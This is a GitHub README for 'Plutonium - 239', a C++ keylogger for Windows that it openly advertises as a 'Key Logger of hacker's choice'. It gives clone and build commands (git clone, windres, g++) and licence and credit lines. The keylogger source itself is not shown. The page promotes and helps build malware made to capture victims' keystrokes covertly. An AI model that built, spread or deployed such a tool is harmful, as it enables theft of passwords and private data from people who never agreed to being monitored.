<p align=center>
  <br>
  <a href="https://dwijottam-dutta.github.io/" target="_blank"><img src="./assets/dj-dk.ico"/></a>
  <br>
  <span><b>Plutonium - 239</b> <br> Key Logger of hacker's choice, written in <i>C++</i> for <u>Windows Platform</u> which focuses on performance</span>
  <br>
</p>

<p align="center">
  <a href="#build">Build</a>
  &nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
  <a href="#licence">Licence</a>
</p>

</p>


## Build

```console
# clone the repo
$ git clone https://github.com/Dwijottam-Dutta/Plutonium-239.git

# change the directory to Plutonium-239
$ cd Plutonium-239

# Using windres
$ windres ./assets/my.rc -O coff -o ./assets/my.res

# Compiling using G++
$ g++ -static-libgcc -static-libstdc++ Plutonium-239.cpp ./assets/my.res
```

## Licence

MIT © Dwijottam Dutta
<br>

Original Creator - [Dwijottam Dutta](https://github.com/Dwijottam-Dutta)
<br>

Contributors - [Dharmesh Kumar](https://github.com/dharmeshkumar1409)